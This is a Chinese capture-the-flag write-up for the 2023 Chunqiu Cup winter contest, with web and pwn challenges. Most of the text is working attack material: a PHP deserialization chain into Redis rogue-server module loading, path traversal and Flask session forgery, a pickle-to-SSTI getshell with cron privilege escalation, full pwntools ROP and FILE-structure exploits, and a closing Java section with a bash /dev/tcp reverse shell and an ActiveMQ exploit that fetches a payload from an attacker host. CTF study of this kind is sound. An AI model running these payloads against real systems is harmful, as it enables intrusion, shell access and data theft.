# 【WP】2023年春秋杯冬季赛WEB、PWN类题目解析

> 原文: https://www.ctfiot.com/159161.html
> ID: 159161

Active-Takeaway

思路

该系统的大致框架为：

customer：生成订单

broker：消息队列

merchant：监控队列上的订单，若接收到则向customer的webhook发送订单已接单的信息。

ezezez_php

POC:

<?php
highlight_file(__file__);

class Rd
{
    public $ending;
    public $cl;
    public $poc;
}

class Poc
{
    public $payload;
    public $fun;
}

class Er
{
    public $symbol;
    public $Flag;
}

class Ha
{
    public $start;
    public $start1;
    public $start2;
}

$a = new Ha;
$a->start1 = new Rd;
$a->start2 = "o.0";
$a->start = ["POC"=>"0.o"];
$a->start1->cl = new Er;
$payload0 = "dict";
$payload1 = "dict://127.0.0.1:6379/config:set:dir:/tmp";
$payload2 = "dict://127.0.0.1:6379/config:set:dbfilename:exp.so";
$payload3 = "dict://127.0.0.1:6379/slaveof:ip:port";
$payload4 = "dict://127.0.0.1:6379/module:load:/tmp/exp.so";
$payload5 = "dict://127.0.0.1:6379/slave:no:one";
$payload6 = "dict://127.0.0.1:6379/system.exec:env";
$payload7 = "dict://127.0.0.1:6379/module:unload:system";
$c = base64_encode($payload1);
$a->start1->cl->Flag = $c;
echo serialize($a);
?>

在vps上开启一个主redis服务，我们启动一个Redis Rogue Server工具即可

python3 redis-rogue-server.py --server-only

payload3的ip:port替换为自己vps的ip和port，依次POST打入反序列化产生的payload1，2，3，4，5，6，7即可拿到flag。

picup

题目无附件，启动题目环境拿到靶机地址访问后会302跳转至/login.php路由：

抓包查看响应包信息收集目录扫描可以根据404页面：

以及响应头：

判断其实际上为Python Web。同时也易发现/register.php路由：

响应包源代码中存在注释提示最多只允许同时注册两个用户，否则再次注册时会清理除admin用户以外的所有已注册的用户从而继续创建新用户：

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Register</title>
</head>
<body>
    <h1>Register</h1>
    <form action="register.php" method="post">
        <div>
            <label for="username">用户名:</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div>
            <label for="username">密&emsp;码:</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">注册</button>
    </form>
<!-- You can only register 2 users,otherwise all registered users(except admin) will be cleared to register new ones. -->
</body>
</html>

在/login.php路由尝试弱密码爆破或SQL注入登录admin用户未果后，不妨在/register.php路由注册一个用户：

可见成功注册会返回用户名以及密码的哈希值（经加密反查尝试可判断为md5），继续在/login.php路由登录：

响应包源代码：

Login success! <a href='/'>Click here to redirect.</a>

点击链接跳转回到/路由（按照PHP Web的思路也易发现该路由同时也是/index.php路由）：

文件上传界面，响应包源代码中存在注释提示Web管理员每10分钟会清理一次所有上传的文件，并且最多只能同时上传4个文件，否则再次上传时会清理所有已经上传的文件从而继续上传新文件：

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Picup</title>
</head>
<body>
    <h1>Pic Upload</h1>
    <form action="/" method="post" enctype="multipart/form-data">
        <div>
            <label for="file">文件：</label>
            <input type="file" name="file" id="file">
        </div>
        <button type="submit">上传</button>
    </form>
    <code>Please upload a valid file!</code>
    <!-- The web administrator clears all uploaded files every 10 minutes -->
    <!-- You can only upload 4 files,otherwise all uploaded files will be cleared to upload new ones. -->
</body>
</html>

随便上传个文件尝试：

响应包源代码：

File upload success! Path: <a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a>.

发现/pic.php路由：

响应包源代码：

<h1>files in ./uploads/</h1><br><a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a><br>

似乎会遍历显示./uploads路径目录下的所有文件并且存在以GET传参pic参数为文件名的文件读取点，点击链接传参?pic=TenMap1e.txt尝试：

是一张损坏的图片，响应包源代码：

<img src="data:image/png;base64,VGVuTWFwMWU=">

易发现实际上就是base64编码的文件内容。经过对任意文件读取的常见过滤绕过尝试可以发现此处对于pic参数的过滤是将../替换为空，可以使用..././的姿势进行绕过，payload：

?pic=..././..././etc/passwd

传参可得：

<img src="data:image/png;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmN0Zjp4Ojk5OTo5OTk6Oi9ob21lL2N0ZjovYmluL3NoCg==">

base64解码即可读取得到/etc/passwd文件的内容：

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
ctf:x:999:999::/home/ctf:/bin/sh

同理尝试读取/app目录下的Web源码：

?pic=..././..././app/app.py

成功读取得到：

#app.py
import os
import pickle
import base64
import hashlib
from flask import Flask,request,session,render_template,redirect
from Users import Users
from waf import waf

users=Users()

app=Flask(__name__)
app.template_folder="./"
app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()

@app.route('/',methods=['GET','POST'])
@app.route('/index.php',methods=['GET','POST'])
def index():
    if not session or not session.get('username'):
        return redirect("login.php")
    if request.method=="POST" and 'file' in request.files and (filename:=waf(request.files['file'])):
        filepath=os.path.join("./uploads",filename)
        request.files['file'].save(filepath)
        return "File upload success! Path: <a href='pic.php?pic="+filename+"'>"+filepath+"</a>."
    return render_template("index.html")

@app.route('/login.php',methods=['GET','POST'])
def login():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and users.login(username,password):
            session['username']=username
            return "Login success! <a href='/'>Click here to redirect.</a>"
        else:
            return "Login fail!"
    return render_template("login.html")

@app.route('/register.php',methods=['GET','POST'])
def register():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password):
            return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
        else:
            return "Register fail!"
    return render_template("register.html")

@app.route('/pic.php',methods=['GET','POST'])
def pic():
    if not session or not session.get('username'):
        return redirect("login.php")
    if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
        if session.get('username')=="admin":
            return pickle.load(open(filepath,"rb"))
        else:
            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
    res="<h1>files in ./uploads/</h1><br>"
    for f in os.listdir("./uploads"):
        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

#Users.py
import hashlib

class Users:
    passwords={}

    def register(self,username,password):
        if username in self.passwords:
            return False
        if len(self.passwords)>=3:
            for u in list(self.passwords.keys()):
                if u!="admin":
                    del self.passwords[u]
        self.passwords[username]=hashlib.md5(password.encode()).hexdigest()
        return True

    def login(self,username,password):
        if username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():
            return True
        return False

#waf.py
import os
from werkzeug.utils import secure_filename

def waf(file):
    if len(os.listdir("./uploads"))>=4:
        os.system("rm -rf /app/uploads/*")

    content=file.read().lower()
    if len(content)>=70:
        return False

    for b in [b"n",b"r",b"\",b"base",b"builtin",b"code",b"command",b"eval",b"exec",b"flag",b"global",b"os",b"output",b"popen",b"pty",b"repeat",b"run",b"setstate",b"spawn",b"subprocess",b"sys",b"system",b"timeit"]:
        if b in content:
            return False

    file.seek(0)
    return secure_filename(file.filename)

代码审计发现/register.php路由存在格式化字符串漏洞：

return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)

注册一个用户名为{users.passwords}的用户即可泄露得到users变量所定义的实现注册登录接口的Users类中的passwords密码字典：

而admin用户的密码md5和flask的secret_key使用的是完全相同的随机值：

app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()

那么这里拿到secret_key我们便可以伪造session身份为admin用户，从而在/pic.php路由中pickle.load反序列化我们上传的文件进行攻击利用而非只是简单地读取文件内容了：

if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
 if session.get('username')=="admin":
  return pickle.load(open(filepath,"rb"))
    else:
  return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''

使用flask_session_cookie_manager脚本（https://github.com/noraj/flask-session-cookie-manager）伪造session：

python flask_session_cookie_manager3.py encode -s "5fa7397bae81174237f01f64c165299c" -t "{'username':'admin'}"

得到（注意每次开启题目环境secret_key都是随机不一样的，故需要自行按照泄露得到的secret_key进行伪造）：

eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA

接下来就是考虑绕过waf函数对于文件上传的过滤从而上传反序列化POC进行攻击，这里存在长度70的限制并且过滤了诸多关键字以及构造opcode的关键字符换行符n。总体思考下来我们需要调用一个比较短且没有被过滤的函数去实现一定的攻击操作，且在无法构造opcode的情况下只能使用4或5版本的pickle协议，但结合题目环境存在任意文件上传点，且最为关键的一点是设置了flask app的模板渲染路径为./（也就是/app）：

app.template_folder="./"

而我们上传文件的上传路径为./uploads/，所以我们上传的所有文件都可以被作为flask的模板文件进行渲染，同时Web源代码中也引入调用了render_template函数对模板文件进行渲染，审计代码不难推断出所有的模板文件都是存放在./也就是/app目录下的。那我们自然也可以按照这个思路通过任意文件上传点上传一个恶意的可以实现模板注入SSTI的POC模板文件，然后再通过pickle反序列化调用render_template函数渲染它即可实现pickle to SSTI的攻击思路。

那我们首先需要构造一个长度不能达到70的SSTI payload，并且需要绕过waf函数的过滤，对于SSTI的攻击思路来说这样的过滤是比较好绕过的，因为字符串可以任意构造，长度的限制也可以使用lipsum构造一个短的SSTI注入，于是有payload：

{{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}

保存为poc文件后上传。继续构造pickle反序列化EXP：

import pickle
from flask import render_template

class EXP():
    def __reduce__(self):
        return(render_template,("uploads/poc",))

exp=EXP()
f=open("exp","wb")
pickle.dump(exp,f)

得到生成的exp文件上传（长度正好小于70），随后带上伪造好的admin用户的session打payload请求包：

GET /pic.php?pic=exp HTTP/1.1
Host: localhost
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA
Content-Length: 39

__import__('os').popen('whoami').read()

即可getshell（最好也可以反弹shell出来方便后续操作，否则exp和poc被定期清除了还得重新上传）：

ls / -al发现/flag权限为700而我们为ctf用户无法读取：

cat /start.sh发现启动容器时root用户执行的命令脚本，其中会定期执行/app/clear.sh这个脚本清理上传的文件：

ls -al发现clear.sh权限为766，我们作为ctf用户有修改的权限：

那我们这里直接修改clear.sh脚本的内容然后等待就可以每10分钟以root用户身份权限执行一次命令了，这里直接写入：

cat /flag > flag

cat clear.sh可见写入成功：

等待一段时间后ls -al即可发现flag文件已成功读取写入到当前目录：

直接cat flag即得flag。

nmanager

glibc 2.35-0ubuntu3

开启canary，full relro，nx enabled，pie关闭

漏洞点在于溢出绕过鉴权的逻辑漏洞和后续栈上分配结构体造成的越界写和越界读

前者绕过生成的随机字符比较

后者控制偏移可以泄露canary和栈上残留的libc地址

然后越界写rop链

from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./nmanager")
elf=ELF("./nmanager")
libc=elf.libc

ret=0x40101a

def modify(n,gd,age,name):
    io.sendlineafter(b"modify ##n",str(n))
    io.sendafter(b"gender: ",gd)
    io.sendlineafter(b"age: ",str(age))
    io.sendafter(b"name: ",name)

def choice(n):
    if n == 0:
        io.sendafter(b"quit now?(Y/y)n",b"n")
    else:
        io.sendafter(b"quit now?(Y/y)n",b"y")
        

payload=b"./flagx00x00"+cyclic(0x58)+b"check passed".ljust(0x20,b"x00")
io.sendlineafter(b"password: ",payload)

## leak libc
modify(8,b"aaaaaaaa",0x10,b"www")
io.recvuntil(b"aaaaaaaa")
leak_addr=u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00"))-0x29d90
print("leak_addr: ",hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
sys_addr=leak_addr+libc.sym[b"system"]
choice(0)
### leak canary
modify(-1,b"a",0x10,b"www")
io.recvuntil(b"gender: a")
canary=u64(io.recv(7).rjust(8,b"x00"))
print("canary: ",hex(canary))
choice(0)
### rop
payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
modify(-1,payload,str_sh,p64(sys_addr))
choice(1)
io.interactive()

book

1.使用反汇编软件发现delete函数存在UAF漏洞

2.glibc2.35的堆题，通过UAF，攻击unsorted bin泄露libc，使用house of apple的手法，劫持_IO_FILE->_wide_data，利用_IO_wfile_overflow函数控制程序执行流。

 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
 _wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
 _wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
 _wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
 _wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C

编写 exp.py ，获取flag。

HouseofSome

题目漏洞是一次任意地址写一字节，注意这一个1字节是不可控的只能为0或者随机，这里使用0

也就是draw分支可以完成一次任意地址写一字节0

void draw() {
    char buf[0x100];
    if(magic || !dev || !name) {
        puts("wrong.");
        return;
    }
    size_t addr, length;
    printf("offset> ");
    addr = getint();
    printf("length> ");
    length = getint();
    if(length < 0 || length > 8) {
        puts("wrong.");
        return;
    }
    fread(0x114514000+addr, 1, 1, dev);
    magic = 1;
}

信息泄露需要从default分支进入，这里，可以看到init函数会将stdin等信息放到栈上（反编译并不能直观看出，需要看汇编，或者调试），利用scanf未读入的trick，输入-，使得scanf不写入tmp内，导致栈上数据泄露，实现泄露libc（这个是设计的难点1，虽然可能有部分pwn手会了解过）

int init() {
    size_t tmp1 = stdin;
    setbuf(tmp1, 0);
    size_t tmp2 = stdout;
    setbuf(tmp2, 0);
    size_t tmp3 = stderr;
    setbuf(tmp3, 0);
}

size_t getint(){
    size_t tmp;
    scanf("%lld", &tmp);
    return tmp;
}

choice = getint();
switch (choice){
 ...
    default:
        printf("invalid option %ld.n", choice);
        break;
}

综上题目的所有前置信息收集完毕，分别为

任意地址写一字节0

泄露libc地址

House_of_some.py：

from pwn import *
import time
# context.arch = "amd64"

class HouseOfSome:
    def __init__(self, libc: ELF, controled_addr, zero_addr) -> None:
        self.libc = libc
        self.controled_addr =controled_addr
        self.READ_LENGTH_DEFAULT = 0x400
        self.LEAK_LENGTH = 0x500
        self.zero_addr = zero_addr

        self.fake_wide_data_template = lambda : flat({
            0x18: 0,
            0x20: 1,
            0x30: 0,
            0xE0: self.libc.symbols['_IO_file_jumps'] - 0x48,
        }, filler=b"x00")

        self.fake_file_read_template = lambda buf_start, buf_end, wide_data, chain, fileno: flat({
            0x00: 0, # _flags
            0x20: 0, # _IO_write_base
            0x28: 0, # _IO_write_ptr
            
            0x38: buf_start, # _IO_buf_base
            0x40: buf_end, # _IO_buf_end
            
            0x70: p32(fileno), # _fileno
            0x82: b"x00", # _vtable_offset
            0x88: self.zero_addr,
            0xc0: 2, # _mode
            0xa0: wide_data, # _wide_data
            0x68: chain, # _chain
            0xd8: self.libc.symbols['_IO_wfile_jumps'], # vtable
        }, filler=b"x00")

        self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
            0x00: 0x800 | 0x1000, # _flags
            
            0x20: buf_start, # _IO_write_base
            0x28: buf_end, # _IO_write_ptr

            0x70: p32(fileno), # _fileno
            0x68: chain, # _chain
            0x88: self.zero_addr,
            0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
        }, filler=b"x00")

        self.wide_data_length = len(self.fake_wide_data_template())
        self.read_file_length = len(self.fake_file_read_template(0, 0, 0, 0, 0))
        self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))

    def next_control_addr(self, addr, len):
        return addr + len
    
    def read(self, fd, buf, len, end=0):
        addr = self.controled_addr
        f_read_file_0 = self.fake_file_read_template(buf, buf+len, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) 
        f_wide_data = self.fake_wide_data_template()
        addr += self.read_file_length + self.wide_data_length
        self.controled_addr = self.next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * 2)
        f_read_file_1 = self.fake_file_read_template(self.controled_addr, 
                                                     self.controled_addr+self.READ_LENGTH_DEFAULT, 
                                                     addr+self.read_file_length, 
                                                     0 if end else self.controled_addr, 
                                                     0) 
        payload = flat([
            f_read_file_0,
            f_wide_data,
            f_read_file_1,
            f_wide_data
        ])
        assert b"n" not in payload, "\n in payload."
        return payload
    
    def write(self, fd, buf, len):
        addr = self.controled_addr
        f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
        addr += self.write_file_length
        f_wide_data = self.fake_wide_data_template()
        self.controled_addr = self.next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)
        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, 0) 
        
        payload = flat([
            f_write_file,
            f_read_file_1,
            f_wide_data
        ])
        assert b"n" not in payload, "\n in payload."
        return payload
    
    def bomb(self, io: tube, retn_addr):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        log.success(f"retn_addr : {retn_addr:#x}")
        buf = io.recv(self.LEAK_LENGTH)
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300)
        io.sendline(payload)

        rop = ROP(self.libc)
        rop.base = stack_leak - self.LEAK_LENGTH + offset
        rop.call('execve', [b'/bin/sh', 0, 0])
        log.info(rop.dump())
        rop_chain = rop.chain()
        assert b"n" not in rop_chain, "\n in rop_chain"
        io.sendline(rop_chain)

    def bomb_raw(self, io: tube, retn_addr):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        log.success(f"retn_addr : {retn_addr:#x}")
        buf = io.recv(self.LEAK_LENGTH)
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300, end=1)
        io.sendline(payload)

        return stack_leak - self.LEAK_LENGTH + offset
    

if __name__ == "__main__":
    # libc = ELF("./libc-2.38.so.6")
    context.arch = 'amd64'
    libc = ELF("./libc.so.6", checksec=None)
    # libc.address = 0x100000000000
    # print(hex(libc.bss()))
    # print(libc.maps)
    # for k, v in libc.symbols.items():
    #     print(k, hex(v))
    code = libc.read(libc.symbols['_IO_file_underflow'], 0x200)
    print(code)
    tmp = disasm(code)
    print(tmp)

exp.py：

from pwn import *
from House_of_some import HouseOfSome

context.log_level = 'debug'
context.arch = 'amd64'

# shellcode = asm(
# f"""
# mov rax, {u64(b"/bin/sh"+bytearray([0]))}
# push rax
# mov rdi, rsp
# mov rsi, 0
# mov rdx, 0
# mov rax, 59
# syscall
# """)

shellcode = asm(
f"""
mov rax, {u64(b"./flag" + bytearray([0,0]))}
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x40
mov rax, 0
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x40
mov rax, 1
syscall
""")

# io = process("./houseofsome")
# io = remote("127.0.0.1", 9999)
io = remote("39.106.48.123", 25077)
tob = lambda x: str(x).encode()

def name(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size> ", tob(size))
    io.sendafter(b"name> ", content)

def dev(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"dev> ", tob(idx))
    
def draw(offset, length):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"offset> ", tob(offset))
    io.sendlineafter(b"length> ", tob(length))

def leave():
    io.sendlineafter(b"> ", b"5")

io.sendlineafter(b"> ", b"-")
io.recvuntil(b"invalid option ")
leak = int(io.recvuntil(b".", drop=True))
log.success(f"leak : {leak:#x}")
libc_base = leak - 0x2207a0
log.success(f"libc_base : {libc_base:#x}")

libc = ELF("./libc.so.6", checksec=None)
libc.address = libc_base
# dev(1)

name(0x2b0-1, flat({
    0x260: {
        0x18: 0,
        0x20: 1,
        0x30: 0,
    }
}, filler=b"x00") + b"n")
name(0x1f00-0x730-1, b"aa" + b"n")
name(0x400-1, b"aa" + b"n")
name(0x590-1, flat({
    0xe0-0x60: libc.symbols['_IO_file_jumps'] - 0x48
}, filler=b"x00") + b"n")
name(0x50-1, b"aa" + b"n")
name(0x600-1, b"aa" + b"n")
name(0x610-1, b"aa" + b"n")
name(0x300-1, b"aa" + b"n")
name(0x2f0-1, b"aa" + b"n")
name(0x360-1, b"aa" + b"n")
name(0x210-1, b"aa" + b"n")
# name(0x80-1, b"aa" + b"n")

environ = libc.symbols['__environ']

name(0xb0-1, flat({
    0x00: 0, # _flags
    0x20: 0, # _IO_write_base
    0x28: 0, # _IO_write_ptr
    
    0x38: environ+8, # _IO_buf_base
    0x40: environ+8+0x400, # _IO_buf_end
 
    0x70: 0, # _fileno
    0x68: environ+8, # _chain
    0x82: b"x00", # _vtable_offset
    0x88: environ-0x10,
    0xa0: b"n"
}, filler=b"x00"))

name(0x20-1, flat({
    0xc0-0x20-0xa0: 2, # _mode
    0xd8-0x20-0xa0: libc.symbols['_IO_wfile_jumps'], # vtable
}, filler=b"x00")[:-1] + b"n")

dev(2)
draw(libc.symbols["_IO_list_all"] - 0x114514000, 1)
leave()

hos = HouseOfSome(libc, environ+8, environ-0x10)

stack = hos.bomb_raw(io, libc.symbols["_IO_flush_all"] + 481)
log.success(f"stack : {stack:#x}")

pop_rdx = 0x0000000000096272 + libc_base

rop = ROP(libc)
rop.base = stack
# print(rop.gadgets)
# print(rop.rdx)
rop.raw(pop_rdx)
rop.raw(7)
rop.call('mprotect', [stack & (~0xfff), 0x1000])
rop.raw(stack + 0x40)
log.info(rop.dump())
rop_chain = rop.chain()

# gdb.attach(io, gdbscript=
# """
# # b free
# # b malloc
# # c
# # b *(_IO_flush_all+341)
# # c
# b mprotect
# c
# """,api=True)

assert b"n" not in rop_chain, "\n in rop_chain"
io.sendline(rop_chain + shellcode)

context.log_level = 'info'
io.interactive()

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，春秋GAME团队将本次题目部署到i春秋CTF大本营的“2023年春秋杯网络安全联赛冬季赛”，欢迎各位师傅交流讨论。
https://www.ichunqiu.com/competition

春秋杯网络安全联赛将持续打造网络安全新社区，希望更多参赛选手通过比赛结识志同道合的朋友以及交流经验和技巧，欢迎更多伙伴加入春秋杯赛事宇宙，期待大家再次相聚，继续挑战新高度，探索更广阔的宇宙星河！

春秋杯赛事交流QQ群：277328440；

春秋杯赛事交流群（微信群），进群请加微信：LNX131020


```
@PostMapping({"/changefood"})
  public String change(@RequestParam String foodServiceClassName, @RequestParam String name) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
    Class<?> foodServiceClass;
    try {
      foodServiceClass = Class.forName(foodServiceClassName);
    } catch (ClassNotFoundException e) {
      foodServiceClass = Class.forName("com.example.customer.service.IronBeefNoodleService");
    } 
    this.foodService = foodServiceClass.getDeclaredConstructor(new Class[] { String.class }).newInstance(new Object[] { name });
    return "Changed to " + foodServiceClassName + " with name " + name;
  }
```



```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api", "");
    String endpoint = uri.replaceAll("/", "");
    if (endpoint.equalsIgnoreCase("changefood")) {
      response.getWriter().write("Under construction...");
      return;
    } 
    chain.doFilter(request, response);
  }
```



```
ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
connectionFactory.setTrustedPackages(List.of(new String[]{"com.example.customer.entity"}));
Connection connection = connectionFactory.createConnection();
connection.start();

Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);

Destination destination = session.createQueue("Orders");

MessageConsumer consumer = session.createConsumer(destination);

consumer.setMessageListener(message -> {
    if (message instanceof TextMessage) {
        TextMessage textMessage = (TextMessage) message;
        try {
            XStream xstream = new XStream(new StaxDriver());
            xstream.allowTypesByWildcard(new String[]{
                    "com.example.customer.entity.*"
            });
            OrderEntity entity = (OrderEntity) xstream.fromXML(textMessage.getText());
            take(entity, args[1]);
        } catch (JMSException e) {
            e.printStackTrace();
        }
    }
});
System.out.println("Waiting for messages...");
```



```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/vpsip/2333 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```



```
wget http://vpsip:8089/ExploitBroker.class && 
java ExploitBroker
```



```
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class ExploitBroker {
    public static void main(String[] args) throws IOException {
        Socket socket = new Socket("localhost", 61616);
        OutputStream os = socket.getOutputStream();
        DataOutputStream dos = new DataOutputStream(os);
        dos.writeInt(0);// size
        dos.writeByte(31);// type
        dos.writeInt(0);// CommandId
        dos.writeBoolean(false);// Command response required
        dos.writeInt(0);// CorrelationId

        // body
        dos.writeBoolean(true);
        // UTF
        dos.writeBoolean(true);
        dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        dos.writeBoolean(true);
        dos.writeUTF("http://vpsip:8089/broker.xml");

        dos.close();
        os.close();
        socket.close();
        
    }
}
```



```
